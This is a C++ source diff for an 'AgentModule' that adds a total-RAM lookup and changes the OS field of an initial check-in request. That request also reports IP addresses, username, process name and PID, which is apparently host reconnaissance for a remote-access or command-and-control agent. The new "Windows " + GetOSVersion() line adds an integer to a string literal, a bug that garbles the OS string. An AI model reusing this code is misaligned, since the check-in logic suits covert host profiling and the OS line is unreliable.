@@ -13,6 +13,7 @@
 #include <iostream>
 #include <memory>
 #include <array>
+#include <cmath>
 
 #pragma comment(lib, "psapi.lib")
 #pragma comment(lib, "iphlpapi.lib")
@@ -219,6 +220,22 @@ int AgentModule::GetOSVersion()
 }
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
+int AgentModule::GetRAM()
+{
+    MEMORYSTATUSEX memInfo;
+    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
+
+    if (GlobalMemoryStatusEx(&memInfo))
+    {
+        double totalRamBytes = static_cast<double>(memInfo.ullTotalPhys);
+        double totalRamGB = totalRamBytes / (1024.0 * 1024.0 * 1024.0);
+        return static_cast<int>(std::round(totalRamGB));
+    }
+    
+    return 0;
+}
+
+//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
 IntitalCheckinRequest AgentModule::GetHostInformation()
 {
     std::string internalIP;
@@ -239,7 +256,7 @@ IntitalCheckinRequest AgentModule::GetHostInformation()
     {
         GetInternalIP(),
         GetExternalViaDNS(),
-        "Windows 11 Pro",
+        "Windows " + GetOSVersion(),
         ConvertLPWSTRToStdString(username),
         GetProcessName(),
         GetPID(),
